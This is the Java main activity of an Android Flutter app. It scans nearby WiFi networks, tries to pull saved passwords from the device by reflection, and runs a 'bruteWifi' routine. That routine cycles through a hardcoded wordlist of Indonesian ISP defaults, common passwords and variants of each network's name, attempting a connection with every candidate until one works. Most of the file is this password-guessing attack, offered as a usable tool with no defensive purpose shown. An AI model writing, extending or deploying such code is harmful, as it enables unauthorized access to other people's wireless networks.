package com.nullx.tr4s;

import android.content.Context;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.net.NetworkRequest;
import android.net.wifi.ScanResult;
import android.net.wifi.WifiConfiguration;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.net.wifi.WifiNetworkSpecifier;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import io.flutter.embedding.android.FlutterActivity;
import io.flutter.embedding.engine.FlutterEngine;
import io.flutter.plugin.common.MethodChannel;
import org.json.JSONArray;
import org.json.JSONObject;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

public class MainActivity extends FlutterActivity {
    private static final String WIFI_CHANNEL = "com.nullx.pp/wifi";
    private static final String WAKE_CHANNEL = "com.nullx.pp/wake";
    private PowerManager.WakeLock _wakeLock;

    private static final String[] WORDLIST = {
        "indihome123","indihome1234","telkom123","telkom1234",
        "biznet123","biznet1234","myrepublic123","firstmedia123",
        "admin123","admin1234","admin12345","administrator",
        "password","password1","password123","12345678",
        "123456789","1234567890","87654321","11111111","00000000",
        "admin","root","user","guest","support",
        "bismillah","allahuakbar","indonesia","jakarta","bandung",
        "iloveyou","iloveyou1","cinta123","sayang123",
        "12345678","123456789","1234567890","00000000","11111111",
        "22222222","33333333","44444444","55555555","66666666",
        "77777777","88888888","99999999","10203040","20304050",
        "01012000","17082021","17082020","01011990","01011995",
        "budi123","andi123","sari123","dewi123","rizki123",
        "ahmad123","muhammad123","putri123","dian123","novi123",
        "telkomindihome","@indihome","indihome@123","biznet@123",
        "Telkom123","Indihome123","Admin123",
        "wifirumah","wificantik","wifikencang","wifisaya",
        "semarang","surabaya","makassar","medan","bali",
        "semangat","sukses","bahagia","cintamu","sayang",
    };

    @Override
    public void configureFlutterEngine(FlutterEngine flutterEngine) {
        super.configureFlutterEngine(flutterEngine);

        // WakeLock channel (untuk ngaji agar HP tidak sleep)
        new MethodChannel(flutterEngine.getDartExecutor().getBinaryMessenger(), WAKE_CHANNEL)
            .setMethodCallHandler((call, result) -> {
                switch (call.method) {
                    case "acquireWakeLock":
                        try {
                            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
                            if (_wakeLock == null) {
                                _wakeLock = pm.newWakeLock(
                                    PowerManager.PARTIAL_WAKE_LOCK | PowerManager.ON_AFTER_RELEASE,
                                    "axrrg:ngaji");
                            }
                            if (!_wakeLock.isHeld()) _wakeLock.acquire();
                            result.success("ok");
                        } catch (Exception e) { result.error("ERR", e.getMessage(), null); }
                        break;
                    case "releaseWakeLock":
                        try {
                            if (_wakeLock != null && _wakeLock.isHeld()) _wakeLock.release();
                            result.success("ok");
                        } catch (Exception e) { result.error("ERR", e.getMessage(), null); }
                        break;
                    default: result.notImplemented();
                }
            });

        // WiFi channel
        new MethodChannel(flutterEngine.getDartExecutor().getBinaryMessenger(), WIFI_CHANNEL)
            .setMethodCallHandler((call, result) -> {
                switch (call.method) {
                    case "scanWifi": {
                        try {
                            WifiManager wm = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
                            if (!wm.isWifiEnabled()) wm.setWifiEnabled(true);
                            wm.startScan();
                            List<ScanResult> scans = wm.getScanResults();
                            JSONArray arr = new JSONArray();
                            for (ScanResult sr : scans) {
                                if (sr.SSID == null || sr.SSID.isEmpty()) continue;
                                JSONObject obj = new JSONObject();
                                obj.put("ssid", sr.SSID);
                                obj.put("bssid", sr.BSSID);
                                obj.put("signal", sr.level);
                                obj.put("security", sr.capabilities);
                                String saved = getSavedPassword(wm, sr.SSID);
                                obj.put("savedPassword", saved != null ? saved : "");
                                WifiInfo cur = wm.getConnectionInfo();
                                obj.put("connected", cur.getSSID().replace("\"","").equals(sr.SSID));
                                arr.put(obj);
                            }
                            result.success(arr.toString());
                        } catch (Exception e) { result.error("SCAN_ERROR", e.getMessage(), null); }
                        break;
                    }
                    case "bruteWifi": {
                        String ssid     = call.argument("ssid");
                        String bssid    = call.argument("bssid");
                        String security = call.argument("security");
                        new Thread(() -> {
                            String found = tryBrute(ssid, bssid, security);
                            new Handler(Looper.getMainLooper()).post(() -> {
                                if (found != null) result.success(found);
                                else result.error("NOT_FOUND", "Password tidak ditemukan di wordlist", null);
                            });
                        }).start();
                        break;
                    }
                    case "connectWifi": {
                        try {
                            String ssid = call.argument("ssid");
                            String pw   = call.argument("password");
                            connectToWifi(ssid, pw != null ? pw : "");
                            result.success("Menghubungkan ke " + ssid);
                        } catch (Exception e) { result.error("CONNECT_ERROR", e.getMessage(), null); }
                        break;
                    }
                    default: result.notImplemented();
                }
            });
    }

    private String tryBrute(String ssid, String bssid, String security) {
        WifiManager wm = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
        List<String> wordlist = new ArrayList<>(Arrays.asList(WORDLIST));
        String ssidClean = ssid.replaceAll("[^a-zA-Z0-9]", "").toLowerCase();
        String ssidUp    = ssid.replaceAll("[^a-zA-Z0-9]", "");
        wordlist.addAll(Arrays.asList(
            ssidClean, ssidUp, ssid,
            ssidClean+"123", ssidClean+"1234", ssidClean+"12345",
            ssidClean+"1", ssidClean+"12", ssidClean+"321",
            ssidUp+"123", ssidUp+"1234",
            ssidClean+"@123", ssidClean+"_123",
            "wifi"+ssidClean, ssidClean+"wifi",
            ssid+"123", ssid+"1234",
            ssid.toLowerCase(), ssid.toUpperCase(),
            ssid.toLowerCase()+"123",
            ssidClean+"00000000", ssidClean+"11111111",
            ssidClean+"88888888", ssidClean+"12345678"
        ));
        for (String pw : wordlist) {
            if (pw == null || pw.length() < 8) continue;
            if (tryConnect(wm, ssid, bssid, pw, security)) return pw;
        }
        return null;
    }

    private boolean tryConnect(WifiManager wm, String ssid, String bssid, String pw, String security) {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                final boolean[] connected = {false};
                WifiNetworkSpecifier.Builder sb = new WifiNetworkSpecifier.Builder().setSsid(ssid);
                try { if (bssid != null && !bssid.isEmpty()) sb.setBssid(android.net.MacAddress.fromString(bssid)); } catch (Exception ignored) {}
                if (security != null && security.contains("WPA")) sb.setWpa2Passphrase(pw);
                else if (!pw.isEmpty()) sb.setWpa2Passphrase(pw);
                NetworkRequest req = new NetworkRequest.Builder()
                    .addTransportType(NetworkCapabilities.TRANSPORT_WIFI)
                    .setNetworkSpecifier(sb.build()).build();
                ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
                final Object lock = new Object();
                cm.requestNetwork(req, new ConnectivityManager.NetworkCallback() {
                    @Override public void onAvailable(Network net) { connected[0] = true; synchronized(lock) { lock.notifyAll(); } }
                    @Override public void onUnavailable() { synchronized(lock) { lock.notifyAll(); } }
                }, 4000);
                synchronized(lock) { lock.wait(4500); }
                return connected[0];
            } else {
                WifiConfiguration wc = new WifiConfiguration();
                wc.SSID = "\"" + ssid + "\"";
                wc.preSharedKey = "\"" + pw + "\"";
                int id = wm.addNetwork(wc);
                if (id < 0) return false;
                wm.disconnect(); wm.enableNetwork(id, true); wm.reconnect();
                Thread.sleep(3000);
                WifiInfo info = wm.getConnectionInfo();
                boolean ok = info.getSSID().replace("\"","").equals(ssid);
                if (!ok) wm.removeNetwork(id);
                return ok;
            }
        } catch (Exception e) { return false; }
    }

    private void connectToWifi(String ssid, String pw) throws Exception {
        WifiManager wm = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            WifiNetworkSpecifier.Builder sb = new WifiNetworkSpecifier.Builder().setSsid(ssid);
            if (!pw.isEmpty()) sb.setWpa2Passphrase(pw);
            NetworkRequest req = new NetworkRequest.Builder()
                .addTransportType(NetworkCapabilities.TRANSPORT_WIFI)
                .setNetworkSpecifier(sb.build()).build();
            ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
            cm.requestNetwork(req, new ConnectivityManager.NetworkCallback() {
                @Override public void onAvailable(Network net) { cm.bindProcessToNetwork(net); }
            });
        } else {
            WifiConfiguration wc = new WifiConfiguration();
            wc.SSID = "\"" + ssid + "\"";
            if (!pw.isEmpty()) wc.preSharedKey = "\"" + pw + "\"";
            else wc.allowedKeyManagement.set(WifiConfiguration.KeyMgmt.NONE);
            int id = wm.addNetwork(wc);
            wm.disconnect(); wm.enableNetwork(id, true); wm.reconnect();
        }
    }

    private String getSavedPassword(WifiManager wm, String ssid) {
        try {
            List<?> configs = wm.getConfiguredNetworks();
            if (configs == null) return null;
            for (Object c : configs) {
                String cSsid = (String) c.getClass().getField("SSID").get(c);
                if (cSsid != null && cSsid.replace("\"","").equals(ssid)) {
                    String psk = (String) c.getClass().getField("preSharedKey").get(c);
                    if (psk != null && !psk.isEmpty() && !psk.equals("*")) return psk.replace("\"","");
                }
            }
        } catch (Exception ignored) {}
        return null;
    }
}
